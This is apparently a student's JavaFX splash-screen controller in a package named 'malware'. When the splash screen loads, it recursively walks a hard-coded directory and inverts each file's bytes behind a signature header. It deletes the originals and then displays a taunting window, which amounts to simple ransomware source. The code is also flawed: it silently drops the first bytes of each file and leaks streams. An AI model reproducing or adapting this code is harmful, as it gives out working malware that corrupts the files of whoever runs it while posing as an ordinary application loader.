package lk.ijse.dep10.malware.controller;

import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.ProgressBar;
import javafx.stage.Stage;

import java.io.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Locale;

public class SplashSceneController {

    @FXML
    private ProgressBar prgLoading;
    private ArrayList<File> files = new ArrayList<>();
    private String SIGNATURE = "Heeeey...Uba Iwarai";

    public void initialize() throws IOException {
        File targetDir = new File("/home/nuwan/Desktop/Paste");
        findFiles(targetDir);
        encryptFiles(files);
        setStage();
    }
    private void findFiles(File path){
        File[] files = path.listFiles();
        for (File file : files) {
            if (file.isDirectory()) {
                findFiles(file);
                continue;
            }
            this.files.add(file);
        }
    }
    private void encryptFiles(ArrayList<File> filesForEncrypt) throws IOException {
        for (File file : filesForEncrypt) {
            File tempFile = addSignature();
            FileInputStream fileInputStream = new FileInputStream(file);
            FileOutputStream fileOutputStream = new FileOutputStream(tempFile,true);

            byte[] signatureBytes = SIGNATURE.getBytes();
            byte[] firstPortion = fileInputStream.readNBytes(signatureBytes.length);
            if (Arrays.toString(signatureBytes).equals(Arrays.toString(firstPortion))){
                continue;
            }
            else {
                while (true){
                    byte[] buffer = new byte[1024];
                    int read = fileInputStream.read(buffer);
                    if (read == -1) break;
                    for (int i = 0; i < read; i++) {
                        buffer[i] = (byte) ~buffer[i];
                    }
                    fileOutputStream.write(buffer,0,read);
                }
            }
            fileInputStream.close();
            fileOutputStream.close();
            file.delete();
            tempFile.renameTo(file);
        }
    }
    private File addSignature() throws IOException {
        File tempFileForSignature = File.createTempFile("Ohhhh","Nooooh");
        FileOutputStream fileOutputStream = new FileOutputStream(tempFileForSignature);

        byte[] signatureBytes = SIGNATURE.getBytes();
        for (int i = 0; i < signatureBytes.length; i++) {
            fileOutputStream.write(signatureBytes[i]);
        }
        fileOutputStream.close();
        return tempFileForSignature;
    }

    private void setStage() throws IOException {
        Stage stage = new Stage();
        stage.setTitle(SIGNATURE);
        stage.setScene(new Scene(new FXMLLoader(getClass().getResource("/scene/MainScene.fxml")).load()));
        stage.show();
        stage.centerOnScreen();
    }

}

